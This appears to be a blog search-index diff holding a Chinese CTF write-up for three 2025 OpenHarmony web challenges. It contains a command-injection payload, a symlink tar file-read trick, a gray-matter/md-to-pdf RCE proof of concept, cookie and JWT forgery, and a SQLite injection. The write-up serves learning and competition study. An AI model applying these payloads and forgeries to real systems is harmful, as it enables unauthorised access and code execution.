@@ -1,6 +1,78 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>2025OpenHarmony-CTF-Web-WP</title>
+    <url>/2025/06/13/2025OpenHarmony-CTF-Web-WP/</url>
+    <content><![CDATA[<p>AKAKAKAKAKAKAKAKAKAKAKAKAKAKAKAKAKAKAK</p>
+<h1 id="Layers-of-Compromise"><a href="#Layers-of-Compromise" class="headerlink" title="Layers of Compromise"></a>Layers of Compromise</h1><p>user&#x2F;password123</p>
+<p>进入后台</p>
+<p>将cookie中role的值改为admin就可以得到API令牌并且跳出logs.php</p>
+<p><img src="E:\1CTFdb\1hexo\blog\secrect\刷题和复现和wp\2025HMCTF.assets\image-20250609005334623.png" alt="image-20250609005334623"></p>
+<p>还有一个文档的hint</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">内部API端点:</span><br><span class="line"></span><br><span class="line">- status</span><br><span class="line"></span><br><span class="line">- config</span><br><span class="line"></span><br><span class="line">- debug (仅限本地访问)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查看 /data/app/www/secrettttts/ 获取开发令牌。                 </span><br></pre></td></tr></table></figure>
+
+<p>接着在secrettttts&#x2F;token.txt获取到开发令牌</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">7</span>f8a1a4b3c7d9e6f2b5s8d7f9g6h5j4k3l2m1n</span><br><span class="line">--</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;auth_token&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$auth_data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;auth_token&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$auth_data</span>[<span class="string">&#x27;username&#x27;</span>] === <span class="string">&#x27;dev&#x27;</span> &amp;&amp;</span><br><span class="line">        <span class="variable">$auth_data</span>[<span class="string">&#x27;hash&#x27;</span>] === <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;dev&#x27;</span> . <span class="variable">$CONFIG</span>[<span class="string">&#x27;auth_key&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">--</span><br><span class="line"><span class="string">&#x27;username&#x27;</span>=&gt;<span class="string">&#x27;dev&#x27;</span> <span class="string">&#x27;auth_key&#x27;</span> =&gt; <span class="string">&#x27;S3cr3tK3y!2023&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>根据提示构造出auth_token</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$auth_data</span> = [</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;dev&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;hash&#x27;</span> =&gt; <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;dev&#x27;</span> . <span class="string">&#x27;S3cr3tK3y!2023&#x27;</span>)</span><br><span class="line">];</span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$auth_data</span>);</span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$serialized</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$payload</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>带上即可访问logs.php</p>
+<p>最后在filter参数发现有命令拼接，把grep语句闭合后即可RCE</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">action=filter_logs&amp;filter=&quot;;grep$&#123;IFS&#125;&quot;&quot;$&#123;IFS&#125;../../fla*/f*;&quot;</span><br></pre></td></tr></table></figure>
+
+<h1 id="Filesystem"><a href="#Filesystem" class="headerlink" title="Filesystem"></a>Filesystem</h1><p>有Next.js的源码，翻阅得知有&#x2F;admin&#x2F;login和&#x2F;admin&#x2F;index路由</p>
+<p><img src="E:\1CTFdb\1hexo\blog\secrect\刷题和复现和wp\2025HMCTF.assets\image-20250609005956513.png" alt="image-20250609005956513"></p>
+<p>在主界面有可以上传文件和下载文件的功能</p>
+<p>分析admin登录逻辑可以知道，admin登录的时候账号是admin，接着密码是从<code>/opt/filesystem/adminconfig.lock</code>的json数据中读取的，很容易想到软连接任意文件读取，分析好目录结构即可读取</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ln -s ../../filesystem/adminconfig.lock 1</span><br><span class="line">tar -cf 1.tar 1</span><br></pre></td></tr></table></figure>
+
+<p><img src="E:\1CTFdb\1hexo\blog\secrect\刷题和复现和wp\2025HMCTF.assets\image-20250609010207019.png" alt="image-20250609010207019"></p>
+<p>登录后就可以使用&#x2F;admin&#x2F;路由下的功能了</p>
+<p>首先发现admin&#x2F;index会把我们的slogon和username给显示渲染</p>
+<p><img src="E:\1CTFdb\1hexo\blog\secrect\刷题和复现和wp\2025HMCTF.assets\image-20250609010318877.png" alt="image-20250609010318877"></p>
+<p>并且是严格限制字数的</p>
+<p><img src="E:\1CTFdb\1hexo\blog\secrect\刷题和复现和wp\2025HMCTF.assets\image-20250609010345137.png" alt="image-20250609010345137"></p>
+<p>所以不难猜测注入点在这，注意到这里是直接从JWT去解析我们的数据，也就是username和slogon，所以只要不通过changePassword接口去修改slogon，直接修改jwt就可以绕过长度限制了，定位到jwt生成逻辑的代码，发现key在app.module.ts中</p>
+<p>如法炮制读出key</p>
+<p><img src="E:\1CTFdb\1hexo\blog\secrect\刷题和复现和wp\2025HMCTF.assets\image-20250609010545069.png" alt="image-20250609010545069"></p>
+<p>之后就可以伪造jwt来绕过长度限制了，至于最后的注入点是出在gray-master这个库的解析上，是一个比较冷门的库，并且这个命令执行漏洞是在一个issue中被提出的</p>
+<p><a href="https://github.com/simonhaenisch/md-to-pdf/issues/99">Security: gray-matter exposes front matter JS-engine that leads to arbitrary code execution · Issue #99 · simonhaenisch&#x2F;md-to-pdf</a></p>
+<p>POC</p>
+<p><img src="E:\1CTFdb\1hexo\blog\secrect\刷题和复现和wp\2025HMCTF.assets\image-20250609010815452.png" alt="image-20250609010815452"></p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; mdToPdf &#125; = <span class="built_in">require</span>(<span class="string">&#x27;md-to-pdf&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> payload = <span class="string">&#x27;---js\n((require(&quot;child_process&quot;)).execSync(&quot;calc&quot;))\n---RCE&#x27;</span>;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">	<span class="keyword">await</span> <span class="title function_">mdToPdf</span>(&#123; <span class="attr">content</span>: payload &#125;, &#123; <span class="attr">dest</span>: <span class="string">&#x27;./output.pdf&#x27;</span> &#125;);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
+
+<p>修改js注入即可RCE，最后是把flag写到根目录的文件中去用软连接读取，因为可下载的目录没有写的权限</p>
+<h1 id="ezAPP-And-SERVER"><a href="#ezAPP-And-SERVER" class="headerlink" title="ezAPP_And_SERVER"></a>ezAPP_And_SERVER</h1><p>给了个HAP文件</p>
+<p>用工具反编译</p>
+<p><a href="https://github.com/ohos-decompiler/abc-decompiler/releases">Releases · ohos-decompiler&#x2F;abc-decompiler</a></p>
+<p>反编译分析逻辑定位到utils</p>
+<p>ai一把锁得到xor的密钥</p>
+<p><img src="E:\1CTFdb\1hexo\blog\secrect\刷题和复现和wp\2025HMCTF.assets\image-20250608165649798.png" alt="image-20250608165649798"></p>
+<p>写脚本得到获得flag的接口和一个通过uuid查找联系人的接口以及其他信息</p>
+<p><img src="E:\1CTFdb\1hexo\blog\secrect\刷题和复现和wp\2025HMCTF.assets\image-20250608170104681.png" alt="image-20250608170104681">全局搜索uid发现八个uid</p>
+<p><img src="E:\1CTFdb\1hexo\blog\secrect\刷题和复现和wp\2025HMCTF.assets\image-20250608165940818.png" alt="image-20250608165940818"></p>
+<p>尝试通过接口查询显示未授权</p>
+<p>继续分析鉴权逻辑</p>
+<p><img src="E:\1CTFdb\1hexo\blog\secrect\刷题和复现和wp\2025HMCTF.assets\image-20250608170315563.png" alt="image-20250608170315563"></p>
+<p>发现需要jwt验证，用上面密钥jwt加密后即可访问接口</p>
+<p><img src="E:\1CTFdb\1hexo\blog\secrect\刷题和复现和wp\2025HMCTF.assets\image-20250608173920876.png" alt="image-20250608173920876"></p>
+<p>测试发现是双引号闭合的sqlite注入，直接得到admin的uuid（列数为4）</p>
+<p><img src="E:\1CTFdb\1hexo\blog\secrect\刷题和复现和wp\2025HMCTF.assets\image-20250608174050990.png" alt="image-20250608174050990"></p>
+<p>9d5ec98c-5848-4450-9e58-9f97b6b3b7bc</p>
+<p>之后再分析getflag接口做了什么</p>
+<p><img src="E:\1CTFdb\1hexo\blog\secrect\刷题和复现和wp\2025HMCTF.assets\image-20250608174150436.png" alt="image-20250608174150436"></p>
+<p>需要传入一个X-sign头来对请求体进行校验</p>
+<p>往上找函数调用</p>
+<p><img src="E:\1CTFdb\1hexo\blog\secrect\刷题和复现和wp\2025HMCTF.assets\image-20250608174250168.png" alt="image-20250608174250168"></p>
+<p>这里就是我们需要传的请求头{“action”:”getflag”}需要rsa加密</p>
+<p>最后构造脚本即可</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> serialization</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.asymmetric <span class="keyword">import</span> padding</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> serialization</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.asymmetric <span class="keyword">import</span> padding</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">public_key_pem = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">-----BEGIN PUBLIC KEY-----</span></span><br><span class="line"><span class="string">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA6HXr1LSOx2q97lSv0p7z</span></span><br><span class="line"><span class="string">hqtgy/JwwWntE73TDKGMSx6Z5lRsDuVjBhuGPI050VkhtIgbAppM4xtsNhwkGfOK</span></span><br><span class="line"><span class="string">s4OSt7PzHVyglkgwX7X04qFZKNOYYDS6Um+gZb5XXwiQ8GcFqfEjbKbLjvegUWur</span></span><br><span class="line"><span class="string">H4sv3OpSIJOiTkhMZqCkfOTUxLF1+mwFDJVt5COQB/frFps/U5+OspjMGAVgORbn</span></span><br><span class="line"><span class="string">99Uuy9KZsGQwX2e+NvvIAtLNaW1lycP0XTQiXnhm+k1+g8MGS01TpUZtwuBrDUAw</span></span><br><span class="line"><span class="string">K/iNbCGQdKQ77J/dEO3YGYHKED2WKmApDGA0lNWou768D0dCHxOwUUwGIQw/CC1s</span></span><br><span class="line"><span class="string">TwIDAQAB</span></span><br><span class="line"><span class="string">-----END PUBLIC KEY-----</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">action = <span class="string">b&#x27;&#123;&quot;action&quot;:&quot;getflag&quot;&#125;&#x27;</span></span><br><span class="line">public_key = serialization.load_pem_public_key(</span><br><span class="line">    public_key_pem.encode(),</span><br><span class="line">    backend=default_backend()</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">encrypted = public_key.encrypt(</span><br><span class="line">    action,</span><br><span class="line">    padding.PKCS1v15()</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">encrypted_b64 = base64.b64encode(encrypted).decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http:///api/v1/getflag&quot;</span>  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = encrypted_b64</span><br><span class="line">request_body = <span class="string">f&#x27;&#123;&#123;&quot;data&quot;:&quot;<span class="subst">&#123;data&#125;</span>&quot;&#125;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">x_sign = hashlib.md5(request_body.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">jwtdo</span>():</span><br><span class="line">    data = &#123;<span class="string">&quot;uid&quot;</span>: <span class="string">&quot;9d5ec98c-5848-4450-9e58-9f97b6b3b7bc&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> jwt.encode(data,<span class="string">&quot;wCvO3WRz9*vNM%rMaApkerY^^jI6vXmh&quot;</span>)</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Authorization&quot;</span>: jwtdo(),</span><br><span class="line">    <span class="string">&quot;X-Sign&quot;</span>: x_sign,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url=url,headers=headers,data=request_body,timeout=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line">    </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+]]></content>
+  </entry>
+  <entry>
     <title>Http分块Chunk的妙用</title>
     <url>/2025/04/01/Http%E5%88%86%E5%9D%97Chunk%E7%9A%84%E5%A6%99%E7%94%A8/</url>
     <content><![CDATA[<h1 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h1><h2 id="Content-Length"><a href="#Content-Length" class="headerlink" title="Content_Length"></a>Content_Length</h2><p><strong>HTTP Connection有两种连接方式</strong>：短连接和长连接；<br><strong>短连接</strong>即一次请求对应一次TCP连接的建立和销毁过程，对应的也就是Connection: close。<br><strong>长连接</strong>是多个请求共用同一个连接这样可以节省大量连接建立时间提高通信效率。目前主流浏览器都会在请求头里面包含Connection:keep-alive字段，该字段的作用就是告诉HTTP服务器响应结束后不要关闭连接，浏览器会将建立的连接缓存起来，当在有限时效内有再次对相同服务器发送请求时则直接从缓存中取出连接进行通信。当然被缓存的连接如果空闲时间超过了设定值（如firefox为115s，IE为60s）则会关闭连接。</p>
